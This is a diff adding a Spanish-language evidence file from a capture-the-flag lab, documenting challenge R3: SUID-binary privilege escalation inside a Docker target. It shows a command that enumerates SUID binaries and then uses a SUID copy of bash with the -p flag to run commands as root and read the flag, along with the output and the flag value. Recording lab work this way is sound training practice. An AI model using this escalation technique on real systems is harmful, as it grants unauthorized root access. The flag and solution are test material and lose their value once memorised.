@@ -1,0 +1,20 @@
+# R3 — Escalada de privilegios por binario SUID · evidencia (Guadalupe)
+# Operado en la victima real (Docker) como usuario 'operador'. Caja negra: no se leyo el codigo del target.
+# Fecha: 2026-11-20 (America/Argentina)
+
+$ docker exec -u operador cyberlab-phantomcorp bash -c 'find / -perm -4000 -type f 2>/dev/null; echo "--- escalo:"; system-check -pc "id; cat /root/flag.txt"'
+/usr/bin/umount
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/local/bin/system-check
+--- escalo:
+uid=1000(operador) gid=1000(operador) euid=0(root) groups=1000(operador)
+FLAG{privesc_suid_root}
+
+# system-check es una copia SUID de bash (dueno root). Con -p mantiene EUID 0 y da shell root.
+# FLAG{privesc_suid_root} -> sha256 verificado contra retos.manifest (R3).
